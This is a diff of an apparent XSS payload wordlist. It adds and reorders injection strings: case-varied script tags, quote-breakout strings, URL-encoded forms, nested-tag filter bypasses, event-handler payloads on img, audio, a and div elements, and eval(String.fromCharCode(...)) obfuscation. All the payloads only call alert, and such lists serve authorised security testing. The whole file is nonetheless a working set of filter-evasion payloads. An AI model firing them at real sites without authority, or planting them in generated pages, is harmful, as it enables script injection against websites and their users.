@@ -1,24 +1,36 @@
 <script>alert(123);</script>
 <ScRipt>alert(123)</ScRipt>
-<SCRIPT>alert(123)</SCRIPT>
 <script>alert('xsspayload');</script>
 <script>alert(`xsspayload`);</script>
 ><script>alert("xsspayload");</script>
-></ScRipt><ScRipt>alert(String.fromCharCode(88,83,83))</ScRipt>
 "><script>alert("xsspayload");</script>
 '><script>alert("xsspayload");</script>
 '"`>xsspayload<script>alert("xsspayload");</script>
+
+></ScRipt><ScRipt>alert(String.fromCharCode(88,83,83))</ScRipt>
+<ScRipt>alert(String.fromCharCode(88,83,83))</ScRipt>
+<ScRipt>eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41))</ScRipt>
 
 ';alert(123);'
 ';alert(123);//
 ";alert(123);//
 `;alert(123);//
 \";alert(123);//
+';alert(123);var xx='
+";alert(123);var xx="
+`;alert(123);var xx=`
+%27%3Balert%28123%29%3Bvar+xx%3D%27
+%22%3Balert%28123%29%3Bvar+xx%3D%22
+%60%3Balert%28123%29%3Bvar+xx%3D%60
 ;alert(String.fromCharCode(88,83,83));//
 '"`;alert(String.fromCharCode(88,83,83));//
+'"`;eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41));//
 
 xss<sc<script>ript>alert(123)</scr</script>ipt>payload
 xss<sC<script>ript>alert(123)</sCr</script>ipt>payload
+
+%3cscript%3ealert%28123%29%3c%2fscript%3e
+%3cscript%3ealert%28123%29%3c%2fscript%3e
 
 <img src=x onerror=jAvaScRipt:alert('xsspayload')>
 <IMG SRC=x onerror=jAvaScRipt:alert('xsspayload')>
@@ -33,5 +45,12 @@ xss<sC<script>ript>alert(123)</sCr</script>ipt>payload
 <audio src=x onerror=javascript:alert(123)>
 <audio src=x onerror=alert(123)>
 
-%3cscript%3ealert%28123%29%3c%2fscript%3e
-%3cscript%3ealert%28123%29%3c%2fscript%3e
+<a onmouseover='alert(123)'>xsspayload</a>
+<a onmouseout='alert(123)'>xsspayload</a>
+<a onmousemove='alert(123)'>xsspayload</a>
+<a onclick='alert(123)'>xsspayload</a>
+<a onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41))">xsspayload</a>
+
+<div onmouseover='alert(123)'>
+<div onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41))">
+
